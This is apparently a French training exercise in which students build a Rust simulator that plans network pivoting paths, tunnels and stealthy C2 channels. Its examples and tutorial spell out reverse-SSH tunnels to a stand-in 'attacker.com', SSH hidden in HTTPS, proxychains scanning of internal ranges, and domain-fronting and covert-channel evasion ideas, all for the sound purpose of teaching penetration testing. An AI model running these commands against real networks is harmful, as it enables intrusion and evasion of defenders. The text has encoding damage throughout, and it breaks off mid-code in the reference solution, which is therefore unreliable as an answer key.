# Exercice 3.2.8-i : pivot_master

**Module :**
3.2.8 â€” Tunneling & Pivoting AvancÃ©

**Concept :**
i â€” Ligolo-ng, Pivoting Techniques, Advanced Tunneling, C2 Obfuscation

**DifficultÃ© :**
â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜† (9/10)

**Type :**
complet

**Tiers :**
2 â€” MÃ©lange (concepts i + j + k + l)

**Langage :**
Rust Edition 2024

**PrÃ©requis :**
- 3.2.8-a (VPN & Tunneling basics)
- 3.2.6-a (Firewall concepts)
- Algorithmes de graphes (BFS/DFS)
- ThÃ©orie des rÃ©seaux TCP/IP

**Domaines :**
Net, Struct, MD

**DurÃ©e estimÃ©e :**
480-600 min (8-10 heures)

**XP Base :**
500

**ComplexitÃ© :**
T8 O(V Ã— E Ã— F) Ã— S6 O(V + E)
*oÃ¹ V = nodes, E = edges, F = firewall rules*

---

## ğŸ“ SECTION 1 : PROTOTYPE & CONSIGNE

### 1.1 Obligations

**Fichier Ã  rendre :** `pivot_master.rs`

**Fonctions autorisÃ©es :**
- `std::collections::{HashMap, HashSet, VecDeque, BinaryHeap}`
- `std::io::{Read, Write}`
- `serde_json` pour parsing JSON
- Algorithmes de graphe personnalisÃ©s

**Fonctions interdites :**
- BibliothÃ¨ques rÃ©seau rÃ©elles (`std::net`, `tokio`, etc.)
- BibliothÃ¨ques de graphes externes (`petgraph`, etc.)
- Tout accÃ¨s systÃ¨me rÃ©el

### 1.2 Consigne

#### ğŸ¬ Version Culture : "INCEPTION â€” RÃªves dans les RÃªves, Tunnels dans les Tunnels"

**"Vous devez plonger plus profondÃ©ment..."** â€” Dom Cobb

Dans le film *Inception* (2010) de Christopher Nolan, Dom Cobb et son Ã©quipe doivent naviguer Ã  travers plusieurs niveaux de rÃªves imbriquÃ©s pour atteindre leur cible. Chaque niveau a ses propres rÃ¨gles, ses propres gardiens (projections hostiles), et le temps s'Ã©coule diffÃ©remment.

Le **pivoting rÃ©seau** fonctionne exactement de la mÃªme maniÃ¨re :
- Chaque **segment rÃ©seau** est un niveau de rÃªve
- Les **firewalls** sont les projections hostiles qui bloquent les intrus
- Les **tunnels** sont les "kicks" qui permettent de passer d'un niveau Ã  l'autre
- L'**hÃ´te compromis** est l'architecte qui construit le rÃªve
- Le **C2 stealth** est le "limbo" â€” l'endroit oÃ¹ on peut se cacher indÃ©finiment

Comme dans Inception, tu dois planifier chaque niveau de ton "extraction" :
- **Niveau 0** : Le monde rÃ©el (ton attacker machine)
- **Niveau 1** : Le DMZ (premier rÃªve partagÃ©)
- **Niveau 2** : Le rÃ©seau interne (rÃªve dans le rÃªve)
- **Niveau 3** : Le serveur critique (le coffre-fort d'Inception)

**"Le rÃªve s'effondre"** â€” Si un tunnel est dÃ©tectÃ©, tout le chemin de pivot s'effondre, exactement comme quand les projections hostiles attaquent dans le film.

**Ta mission :**

Ã‰crire un simulateur de pivoting qui, tel un architecte d'Inception, planifie les chemins optimaux Ã  travers les segments rÃ©seau.

#### 1.2.2 Version AcadÃ©mique

**Contexte technique :**

Le **pivoting** est une technique d'attaque oÃ¹ un attaquant utilise un systÃ¨me compromis comme point de passage pour atteindre d'autres systÃ¨mes non directement accessibles. C'est fondamental dans les tests d'intrusion pour atteindre les segments rÃ©seau isolÃ©s.

**Ta mission :**

ImplÃ©menter un simulateur de pivoting rÃ©seau qui :

1. **Parse la topologie rÃ©seau** (JSON) :
   - Segments rÃ©seau avec leurs plages CIDR
   - Connexions entre segments (liens bidirectionnels ou non)
   - Firewalls avec rÃ¨gles entre segments
   - HÃ´tes compromis avec leurs capacitÃ©s

2. **Calcule les chemins de pivot** :
   - Algorithme de parcours de graphe (BFS/Dijkstra)
   - VÃ©rification des rÃ¨gles firewall pour chaque saut
   - Identification des ports/protocoles nÃ©cessaires

3. **Ã‰value les techniques de tunneling** :
   - SSH forwarding (local/remote/dynamic)
   - Ligolo-ng (TUN interface)
   - ProxyChains compatibility
   - SOCKS proxy

4. **DÃ©tecte les opportunitÃ©s C2 stealth** :
   - Domain fronting via CDN
   - Cloud C2 (AWS, Azure, GCP endpoints)
   - DNS over HTTPS tunneling
   - HTTPS blending

5. **GÃ©nÃ¨re un plan optimal** :
   - Chemin avec le moins de sauts
   - Techniques recommandÃ©es par segment
   - Commandes Ã  exÃ©cuter

**EntrÃ©e :**
```json
{
  "network_topology": {
    "segments": [
      {
        "id": "internet",
        "cidr": "0.0.0.0/0",
        "description": "Internet"
      },
      {
        "id": "dmz",
        "cidr": "10.0.1.0/24",
        "description": "DMZ"
      },
      {
        "id": "internal",
        "cidr": "10.0.2.0/24",
        "description": "Internal Network"
      }
    ],
    "links": [
      {"from": "internet", "to": "dmz", "bidirectional": false},
      {"from": "dmz", "to": "internal", "bidirectional": true}
    ]
  },
  "compromised_hosts": [
    {
      "id": "web01",
      "segment": "dmz",
      "ip": "10.0.1.10",
      "capabilities": ["ssh", "nc", "python"],
      "access_level": "user"
    }
  ],
  "firewall_rules": [
    {
      "id": "fw-dmz",
      "from_segment": "internet",
      "to_segment": "dmz",
      "rules": [
        {"action": "allow", "port": 443, "protocol": "tcp"},
        {"action": "allow", "port": 80, "protocol": "tcp"},
        {"action": "deny", "port": "*", "protocol": "*"}
      ]
    }
  ],
  "target": {
    "segment": "internal",
    "ip": "10.0.2.50",
    "port": 22
  },
  "attacker": {
    "segment": "internet",
    "ip": "attacker.com"
  },
  "stealth_options": {
    "cdn_endpoints": ["cloudfront.net", "cdn.cloudflare.com"],
    "cloud_endpoints": ["*.amazonaws.com", "*.azure.com"],
    "doh_servers": ["dns.google", "cloudflare-dns.com"]
  }
}
```

**Sortie :**
```json
{
  "pivot_paths": [
    {
      "path_id": 1,
      "hops": ["internet", "dmz", "internal"],
      "feasible": true,
      "blocked_by": null,
      "total_depth": 2
    }
  ],
  "tunnel_recommendations": [
    {
      "hop": {"from": "internet", "to": "dmz"},
      "technique": "reverse_ssh",
      "command": "ssh -R 9050:localhost:9050 attacker@attacker.com",
      "via_host": "web01",
      "ports_required": [443],
      "stealth_score": 7
    }
  ],
  "stealth_options": [
    {
      "type": "domain_fronting",
      "cdn": "cloudfront.net",
      "real_c2": "c2.attacker.com",
      "effectiveness": "high",
      "detection_risk": "low"
    }
  ],
  "optimal_plan": {
    "total_hops": 2,
    "estimated_detection_risk": "medium",
    "commands": [
      "Step 1: From web01, establish reverse SSH to attacker",
      "Step 2: Configure ProxyChains through SSH SOCKS",
      "Step 3: Access internal:10.0.2.50:22 via proxy"
    ]
  },
  "warnings": [
    "Path internet->dmz requires port 443 (HTTPS) - consider HTTPS tunnel"
  ]
}
```

**Contraintes :**
- Graphe de segments â‰¤ 50 nÅ“uds
- â‰¤ 100 rÃ¨gles firewall par segment
- â‰¤ 20 hÃ´tes compromis
- Chemins de pivot â‰¤ 10 sauts

**Exemples :**

| ScÃ©nario | RÃ©sultat | Explication |
|----------|----------|-------------|
| Internet â†’ DMZ (port 443 autorisÃ©) | Chemin faisable | HTTPS tunnel possible |
| Internet â†’ Internal (direct) | Chemin bloquÃ© | Pas de lien direct |
| DMZ â†’ Internal (rÃ¨gle deny all) | Chemin bloquÃ© | Firewall bloque tout |
| DMZ â†’ Internal (port 22 autorisÃ©, host compromis avec SSH) | Chemin faisable | SSH pivot possible |

### 1.3 Prototype

```rust
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet, VecDeque};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PivotInput {
    pub network_topology: NetworkTopology,
    pub compromised_hosts: Vec<CompromisedHost>,
    pub firewall_rules: Vec<FirewallConfig>,
    pub target: Target,
    pub attacker: Attacker,
    pub stealth_options: StealthOptions,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NetworkTopology {
    pub segments: Vec<Segment>,
    pub links: Vec<Link>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Segment {
    pub id: String,
    pub cidr: String,
    pub description: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Link {
    pub from: String,
    pub to: String,
    pub bidirectional: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CompromisedHost {
    pub id: String,
    pub segment: String,
    pub ip: String,
    pub capabilities: Vec<String>,
    pub access_level: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FirewallConfig {
    pub id: String,
    pub from_segment: String,
    pub to_segment: String,
    pub rules: Vec<FirewallRule>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FirewallRule {
    pub action: String,
    pub port: PortSpec,
    pub protocol: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(untagged)]
pub enum PortSpec {
    Single(u16),
    Any(String),  // "*"
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Target {
    pub segment: String,
    pub ip: String,
    pub port: u16,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Attacker {
    pub segment: String,
    pub ip: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StealthOptions {
    pub cdn_endpoints: Vec<String>,
    pub cloud_endpoints: Vec<String>,
    pub doh_servers: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PivotOutput {
    pub pivot_paths: Vec<PivotPath>,
    pub tunnel_recommendations: Vec<TunnelRecommendation>,
    pub stealth_options: Vec<StealthOption>,
    pub optimal_plan: OptimalPlan,
    pub warnings: Vec<String>,
}

// Fonction principale
pub fn analyze_pivoting(input: &PivotInput) -> PivotOutput;

// Fonctions auxiliaires
pub fn build_network_graph(topology: &NetworkTopology) -> HashMap<String, Vec<String>>;
pub fn find_all_paths(graph: &HashMap<String, Vec<String>>, start: &str, end: &str) -> Vec<Vec<String>>;
pub fn check_firewall_rules(rules: &[FirewallConfig], from: &str, to: &str, port: u16, protocol: &str) -> bool;
pub fn get_hosts_in_segment(hosts: &[CompromisedHost], segment: &str) -> Vec<&CompromisedHost>;
pub fn recommend_tunnel_technique(host: &CompromisedHost, allowed_ports: &[u16]) -> TunnelRecommendation;
pub fn evaluate_stealth_options(options: &StealthOptions, path: &[String]) -> Vec<StealthOption>;
pub fn generate_optimal_plan(paths: &[PivotPath], tunnels: &[TunnelRecommendation]) -> OptimalPlan;
```

---

## ğŸ’¡ SECTION 2 : LE SAVIEZ-VOUS ?

### 2.1 L'Art du Pivoting : De l'Ombre Ã  la LumiÃ¨re

Le **pivoting** est l'une des techniques les plus fondamentales et les plus puissantes en test d'intrusion. Le terme vient du basketball â€” un joueur qui "pivote" garde un pied ancrÃ© tout en tournant pour trouver une ouverture.

### 2.2 Ligolo-ng : La RÃ©volution du Tunneling

**Ligolo-ng** est un outil moderne de tunneling qui utilise une interface TUN pour crÃ©er un tunnel transparent :

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                     LIGOLO-NG ARCHITECTURE                          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                     â”‚
â”‚   ATTACKER                           AGENT (compromised host)       â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”               â”‚
â”‚   â”‚  ligolo-ng  â”‚â—„â”€â”€â”€â”€â”€ TLS â”€â”€â”€â”€â”€â”€â”€â”€â–ºâ”‚   agent     â”‚               â”‚
â”‚   â”‚   proxy     â”‚     WebSocket      â”‚             â”‚               â”‚
â”‚   â””â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜                    â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜               â”‚
â”‚         â”‚                                   â”‚                       â”‚
â”‚         â–¼                                   â–¼                       â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”               â”‚
â”‚   â”‚  TUN iface  â”‚                    â”‚  Network    â”‚               â”‚
â”‚   â”‚  10.0.2.0/24â”‚                    â”‚  10.0.2.0/24â”‚               â”‚
â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜               â”‚
â”‚         â”‚                                   â”‚                       â”‚
â”‚         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                       â”‚
â”‚                     Transparent Routing                             â”‚
â”‚                                                                     â”‚
â”‚   Attacker peut maintenant accÃ©der Ã  10.0.2.0/24                   â”‚
â”‚   comme s'il Ã©tait directement connectÃ© !                           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**Avantages de Ligolo-ng :**
- Pas besoin de SOCKS proxy
- Support IPv4 et IPv6
- Pas d'outils sur la cible (agent lÃ©ger)
- Chiffrement TLS

### 2.3 Techniques de Pivoting Classiques

**1. SSH Port Forwarding :**
```bash
# Local Forward : accÃ©der Ã  un port distant via un tunnel
ssh -L 8080:internal-server:80 user@pivot-host

# Remote Forward : exposer un port local vers le rÃ©seau distant
ssh -R 9050:localhost:9050 user@attacker.com

# Dynamic SOCKS : proxy SOCKS complet
ssh -D 9050 user@pivot-host
```

**2. ProxyChains :**
```bash
# Configuration dans /etc/proxychains.conf
socks5 127.0.0.1 9050

# Utilisation
proxychains nmap -sT -Pn 10.0.2.0/24
```

### 2.4 Domain Fronting : L'Art de se Cacher

**Domain fronting** exploite les CDN pour masquer le vrai destination du trafic :

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    DOMAIN FRONTING                               â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                  â”‚
â”‚   CLIENT                        CDN                    C2        â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”    HTTPS     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     HTTP    â”Œâ”€â”€â”€â”€â”€â”€â”  â”‚
â”‚   â”‚      â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–ºâ”‚               â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–ºâ”‚      â”‚  â”‚
â”‚   â”‚      â”‚              â”‚  CloudFront   â”‚             â”‚ C2   â”‚  â”‚
â”‚   â””â”€â”€â”€â”€â”€â”€â”˜              â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜             â””â”€â”€â”€â”€â”€â”€â”˜  â”‚
â”‚                                                                  â”‚
â”‚   TLS SNI: legitimate.cloudfront.net  â† Ce que voit le firewall â”‚
â”‚   HTTP Host: malicious.cloudfront.net â† Vrai destination        â”‚
â”‚                                                                  â”‚
â”‚   Le firewall voit du trafic vers CloudFront = LÃ‰GITIME        â”‚
â”‚   En rÃ©alitÃ©, le CDN route vers le C2 de l'attaquant           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 2.5 DANS LA VRAIE VIE

| MÃ©tier | Cas d'Usage |
|--------|-------------|
| **Red Teamer** | Ã‰tablit des chemins de pivot pour atteindre les systÃ¨mes critiques lors des engagements |
| **Pentester** | Utilise le pivoting pour tester la segmentation rÃ©seau |
| **Incident Responder** | Identifie les chemins de pivot utilisÃ©s par les attaquants |
| **Security Architect** | ConÃ§oit des architectures rÃ©seau rÃ©sistantes au pivoting |
| **SOC Analyst** | DÃ©tecte les tunnels et comportements de pivoting anormaux |

---

## ğŸ–¥ï¸ SECTION 3 : EXEMPLE D'UTILISATION

### 3.0 Session bash

```bash
$ ls
pivot_master.rs  main.rs  Cargo.toml

$ cargo build --release

$ cat input.json
{
  "network_topology": {
    "segments": [
      {"id": "internet", "cidr": "0.0.0.0/0", "description": "Internet"},
      {"id": "dmz", "cidr": "10.0.1.0/24", "description": "DMZ"},
      {"id": "internal", "cidr": "10.0.2.0/24", "description": "Internal"}
    ],
    "links": [
      {"from": "internet", "to": "dmz", "bidirectional": false},
      {"from": "dmz", "to": "internal", "bidirectional": true}
    ]
  },
  "compromised_hosts": [
    {
      "id": "web01",
      "segment": "dmz",
      "ip": "10.0.1.10",
      "capabilities": ["ssh", "nc", "python"],
      "access_level": "user"
    }
  ],
  "firewall_rules": [
    {
      "id": "fw-internet-dmz",
      "from_segment": "internet",
      "to_segment": "dmz",
      "rules": [
        {"action": "allow", "port": 443, "protocol": "tcp"},
        {"action": "deny", "port": "*", "protocol": "*"}
      ]
    },
    {
      "id": "fw-dmz-internal",
      "from_segment": "dmz",
      "to_segment": "internal",
      "rules": [
        {"action": "allow", "port": 22, "protocol": "tcp"},
        {"action": "allow", "port": 3306, "protocol": "tcp"},
        {"action": "deny", "port": "*", "protocol": "*"}
      ]
    }
  ],
  "target": {"segment": "internal", "ip": "10.0.2.50", "port": 22},
  "attacker": {"segment": "internet", "ip": "attacker.com"},
  "stealth_options": {
    "cdn_endpoints": ["cloudfront.net"],
    "cloud_endpoints": ["*.amazonaws.com"],
    "doh_servers": ["dns.google"]
  }
}

$ ./target/release/pivot_master < input.json
{
  "pivot_paths": [
    {
      "path_id": 1,
      "hops": ["internet", "dmz", "internal"],
      "feasible": true,
      "blocked_by": null,
      "total_depth": 2
    }
  ],
  "tunnel_recommendations": [
    {
      "hop": {"from": "internet", "to": "dmz"},
      "technique": "reverse_ssh_over_https",
      "command": "ssh -o 'ProxyCommand=openssl s_client -connect web01:443 -quiet' -R 9050:localhost:9050 attacker@attacker.com",
      "via_host": "web01",
      "ports_required": [443],
      "stealth_score": 8
    },
    {
      "hop": {"from": "dmz", "to": "internal"},
      "technique": "ssh_dynamic",
      "command": "ssh -D 1080 user@10.0.2.50",
      "via_host": "web01",
      "ports_required": [22],
      "stealth_score": 6
    }
  ],
  "stealth_options": [
    {
      "type": "domain_fronting",
      "cdn": "cloudfront.net",
      "real_c2": "hidden.cloudfront.net",
      "effectiveness": "high",
      "detection_risk": "low"
    }
  ],
  "optimal_plan": {
    "total_hops": 2,
    "estimated_detection_risk": "medium",
    "commands": [
      "Step 1: On web01 (10.0.1.10), establish reverse SSH tunnel to attacker",
      "Step 2: Configure SOCKS proxy on attacker (port 9050)",
      "Step 3: Use ProxyChains to access internal:10.0.2.50:22"
    ]
  },
  "warnings": [
    "Internet->DMZ: Only port 443 allowed, use HTTPS-based tunnel"
  ]
}
```

---

## âš¡ SECTION 3.1 : BONUS EXPERT (OPTIONNEL)

**DifficultÃ© Bonus :**
ğŸ§  (12/10)

**RÃ©compense :**
XP Ã—6

**Time Complexity attendue :**
O(V! / (V-k)!) pour k-chemins optimaux

**Space Complexity attendue :**
O(VÂ²)

**Domaines Bonus :**
`Crypto, DP`

### 3.1.1 Consigne Bonus

**ğŸ¬ "Le Limbo de Cobb" â€” Multi-Path Redundancy avec Obfuscation**

Dans Inception, le Limbo est le niveau le plus profond â€” un espace oÃ¹ le temps est presque infini et oÃ¹ on peut construire des mondes entiers. Les Red Teamers les plus avancÃ©s font la mÃªme chose : ils construisent des infrastructures de pivot si complexes et redondantes qu'elles deviennent presque impossibles Ã  dÃ©manteler.

**Ta mission avancÃ©e :**

1. **Multi-Path Pivoting** : Calculer K chemins disjoints (pas de nÅ“uds en commun) pour la redondance
2. **Obfuscation temporelle** : Simuler des dÃ©lais alÃ©atoires pour Ã©viter la dÃ©tection basÃ©e sur timing
3. **Fallback automatique** : Si un chemin tombe, activer le suivant
4. **Covert channel detection** : Identifier les canaux cachÃ©s possibles (DNS, ICMP, HTTP headers)
5. **Cost optimization** : Minimiser le "coÃ»t" (dÃ©tectabilitÃ© Ã— nombre de sauts)

**EntrÃ©e additionnelle :**
```json
{
  "advanced_options": {
    "redundancy_level": 3,
    "max_detection_score": 5,
    "covert_channels_enabled": true,
    "timing_jitter_ms": [100, 5000]
  }
}
```

**Sortie additionnelle :**
```json
{
  "redundant_paths": [
    {"primary": ["A", "B", "C"], "fallback_1": ["A", "D", "C"], "fallback_2": ["A", "E", "F", "C"]},
  ],
  "covert_channels": [
    {"type": "dns_txt", "bandwidth_kbps": 5, "detection_risk": "low"},
    {"type": "icmp_payload", "bandwidth_kbps": 10, "detection_risk": "medium"}
  ],
  "timing_profile": {
    "min_delay_ms": 100,
    "max_delay_ms": 5000,
    "jitter_pattern": "exponential"
  },
  "total_cost": 12.5
}
```

### 3.1.2 Prototype Bonus

```rust
pub fn analyze_pivoting_advanced(
    input: &PivotInput,
    advanced: &AdvancedOptions
) -> AdvancedPivotOutput;

pub fn find_k_disjoint_paths(
    graph: &HashMap<String, Vec<String>>,
    start: &str,
    end: &str,
    k: usize
) -> Vec<Vec<String>>;

pub fn identify_covert_channels(
    firewall_rules: &[FirewallConfig],
    path: &[String]
) -> Vec<CovertChannel>;

pub fn calculate_path_cost(
    path: &[String],
    tunnels: &[TunnelRecommendation],
    detection_weights: &HashMap<String, f64>
) -> f64;
```

### 3.1.3 Ce qui change par rapport Ã  l'exercice de base

| Aspect | Base | Bonus |
|--------|------|-------|
| Chemins | 1 optimal | K chemins disjoints |
| DÃ©tection | Score simple | ModÃ¨le coÃ»t multi-facteur |
| Channels | Standard (SSH, HTTP) | + Covert (DNS, ICMP) |
| Timing | Non simulÃ© | Jitter pattern simulÃ© |
| ComplexitÃ© | O(V Ã— E) | O(V! / (V-k)!) |

---

## âœ…âŒ SECTION 4 : ZONE CORRECTION

### 4.1 Moulinette

| Test | EntrÃ©e | Sortie Attendue | Points |
|------|--------|-----------------|--------|
| `test_simple_path` | 3 segments linÃ©aires, pas de FW | 1 chemin faisable | 5 |
| `test_blocked_by_firewall` | FW deny all entre segments | Chemin bloquÃ© | 10 |
| `test_port_specific` | FW allow port 443 only | Tunnel HTTPS recommandÃ© | 10 |
| `test_no_compromised_host` | Pas d'hÃ´te dans segment intermÃ©diaire | Chemin infaisable (no pivot point) | 10 |
| `test_multi_hop` | 5 segments en chaÃ®ne | 4 sauts, techniques par saut | 15 |
| `test_domain_fronting` | CDN endpoints fournis | Options stealth dÃ©tectÃ©es | 10 |
| `test_bidirectional_link` | Link bidirectionnel | 2 chemins possibles | 10 |
| `test_capability_check` | HÃ´te sans SSH | Technique alternative (nc) | 10 |
| `test_cyclic_topology` | Graphe avec cycles | Chemins sans boucle | 10 |
| `test_optimal_plan` | Plusieurs chemins valides | Plan avec moins de sauts | 10 |

### 4.2 main.rs de test

```rust
use pivot_master::*;
use serde_json;

fn main() {
    // Test 1: Simple path
    let input1 = r#"{
        "network_topology": {
            "segments": [
                {"id": "A", "cidr": "10.0.1.0/24", "description": "Start"},
                {"id": "B", "cidr": "10.0.2.0/24", "description": "Middle"},
                {"id": "C", "cidr": "10.0.3.0/24", "description": "End"}
            ],
            "links": [
                {"from": "A", "to": "B", "bidirectional": true},
                {"from": "B", "to": "C", "bidirectional": true}
            ]
        },
        "compromised_hosts": [
            {"id": "pivot1", "segment": "B", "ip": "10.0.2.10", "capabilities": ["ssh"], "access_level": "root"}
        ],
        "firewall_rules": [],
        "target": {"segment": "C", "ip": "10.0.3.50", "port": 22},
        "attacker": {"segment": "A", "ip": "10.0.1.100"},
        "stealth_options": {"cdn_endpoints": [], "cloud_endpoints": [], "doh_servers": []}
    }"#;

    let input: PivotInput = serde_json::from_str(input1).unwrap();
    let output = analyze_pivoting(&input);

    assert!(output.pivot_paths.len() >= 1);
    assert!(output.pivot_paths[0].feasible);
    assert_eq!(output.pivot_paths[0].hops, vec!["A", "B", "C"]);
    println!("Test 1 (simple path): OK");

    // Test 2: Blocked by firewall
    let input2 = r#"{
        "network_topology": {
            "segments": [
                {"id": "A", "cidr": "10.0.1.0/24", "description": "Start"},
                {"id": "B", "cidr": "10.0.2.0/24", "description": "End"}
            ],
            "links": [
                {"from": "A", "to": "B", "bidirectional": true}
            ]
        },
        "compromised_hosts": [],
        "firewall_rules": [
            {
                "id": "fw1",
                "from_segment": "A",
                "to_segment": "B",
                "rules": [
                    {"action": "deny", "port": "*", "protocol": "*"}
                ]
            }
        ],
        "target": {"segment": "B", "ip": "10.0.2.50", "port": 22},
        "attacker": {"segment": "A", "ip": "10.0.1.100"},
        "stealth_options": {"cdn_endpoints": [], "cloud_endpoints": [], "doh_servers": []}
    }"#;

    let input: PivotInput = serde_json::from_str(input2).unwrap();
    let output = analyze_pivoting(&input);

    assert!(!output.pivot_paths[0].feasible);
    assert!(output.pivot_paths[0].blocked_by.is_some());
    println!("Test 2 (blocked by firewall): OK");

    // Test 3: Stealth options
    let input3 = r#"{
        "network_topology": {
            "segments": [
                {"id": "A", "cidr": "10.0.1.0/24", "description": "Start"},
                {"id": "B", "cidr": "10.0.2.0/24", "description": "End"}
            ],
            "links": [
                {"from": "A", "to": "B", "bidirectional": true}
            ]
        },
        "compromised_hosts": [
            {"id": "host1", "segment": "A", "ip": "10.0.1.10", "capabilities": ["ssh", "curl"], "access_level": "user"}
        ],
        "firewall_rules": [
            {
                "id": "fw1",
                "from_segment": "A",
                "to_segment": "B",
                "rules": [
                    {"action": "allow", "port": 443, "protocol": "tcp"},
                    {"action": "deny", "port": "*", "protocol": "*"}
                ]
            }
        ],
        "target": {"segment": "B", "ip": "10.0.2.50", "port": 22},
        "attacker": {"segment": "A", "ip": "10.0.1.100"},
        "stealth_options": {
            "cdn_endpoints": ["cloudfront.net", "cdn.cloudflare.com"],
            "cloud_endpoints": ["*.amazonaws.com"],
            "doh_servers": ["dns.google"]
        }
    }"#;

    let input: PivotInput = serde_json::from_str(input3).unwrap();
    let output = analyze_pivoting(&input);

    assert!(!output.stealth_options.is_empty());
    assert!(output.stealth_options.iter().any(|s| s.option_type == "domain_fronting"));
    println!("Test 3 (stealth options): OK");

    println!("\nAll tests passed!");
}
```

### 4.3 Solution de rÃ©fÃ©rence

```rust
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet, VecDeque};

// ============ STRUCTURES DE DONNÃ‰ES ============

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PivotInput {
    pub network_topology: NetworkTopology,
    pub compromised_hosts: Vec<CompromisedHost>,
    pub firewall_rules: Vec<FirewallConfig>,
    pub target: Target,
    pub attacker: Attacker,
    pub stealth_options: StealthOptions,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NetworkTopology {
    pub segments: Vec<Segment>,
    pub links: Vec<Link>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Segment {
    pub id: String,
    pub cidr: String,
    pub description: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Link {
    pub from: String,
    pub to: String,
    pub bidirectional: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CompromisedHost {
    pub id: String,
    pub segment: String,
    pub ip: String,
    pub capabilities: Vec<String>,
    pub access_level: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FirewallConfig {
    pub id: String,
    pub from_segment: String,
    pub to_segment: String,
    pub rules: Vec<FirewallRule>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FirewallRule {
    pub action: String,
    pub port: PortSpec,
    pub protocol: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(untagged)]
pub enum PortSpec {
    Single(u16),
    Any(String),
}

impl PortSpec {
    fn matches(&self, port: u16) -> bool {
        match self {
            PortSpec::Single(p) => *p == port,
